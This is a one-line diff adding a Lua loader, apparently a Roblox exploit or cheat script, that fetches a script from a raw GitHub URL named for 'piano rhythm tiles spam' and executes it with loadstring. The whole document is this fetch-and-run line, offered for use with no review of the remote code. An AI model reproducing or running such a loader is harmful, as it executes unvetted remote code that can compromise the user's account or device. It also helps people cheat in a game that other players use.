@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/piano-rhythm-tiles-spam3-qsx9jdacixok8o.lua"))()
